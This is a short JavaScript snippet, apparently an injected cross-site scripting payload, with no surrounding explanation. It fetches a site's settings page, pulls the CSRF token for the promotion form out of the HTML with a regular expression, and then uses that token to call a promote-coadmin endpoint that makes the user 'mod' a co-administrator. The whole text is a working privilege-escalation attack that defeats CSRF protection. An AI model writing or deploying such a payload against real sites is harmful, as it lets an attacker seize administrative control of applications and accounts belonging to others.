fetch("/settings.php").then(r=>r.text()).then(d=>{
    let t=d.match(/csrf_token_promote.\s*value=.([a-f0-9]{32})/)[1];
    fetch("/promote_coadmin.php?username=mod&csrf_token_promote="+t);
});
